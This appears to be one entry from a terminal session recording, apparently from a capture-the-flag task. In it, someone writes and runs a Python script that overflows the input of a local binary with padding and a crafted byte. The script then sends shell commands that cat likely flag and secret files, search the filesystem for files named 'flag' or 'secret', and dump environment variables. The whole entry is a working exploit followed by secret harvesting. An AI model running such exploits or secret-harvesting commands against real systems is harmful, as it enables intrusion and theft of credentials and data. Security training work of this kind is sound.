[3429.979936, "i", "cat << 'EOF' > /tmp/run.py\nimport subprocess, time, sys\n\np = subprocess.Popen(['/app/directory.bin'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)\n\nfor i in range(9):\n    p.stdin.write(b\"1B\\n\")\n    p.stdin.flush()\n    time.sleep(0.05)\n\np.stdin.write(b\"1\" + b\"B\" + b\"A\"*38 + b\"\\x3b\")\np.stdin.flush()\ntime.sleep(0.05)\n\np.stdin.write(b\"4\\n\")\np.stdin.flush()\ntime.sleep(0.05)\n\np.stdin.write(b\"echo EXPLOIT_SUCCESS\\n\")\np.stdin.write(b\"cat /flag.txt /flag /app/flag.txt /root/flag.txt /secret 2>/dev/null\\n\")\np.stdin.write(b\"find / -name '*flag*' -o -name '*secret*' 2>/dev/null\\n\")\np.stdin.write(b\"env\\n\")\np.stdin.write(b\"exit\\n\")\np.stdin.flush()\ntime.sleep(1)\n\nout = p.stdout.read()\nsys.stdout.buffer.write(out)\nEOF\npython3 /tmp/run.py\n"]
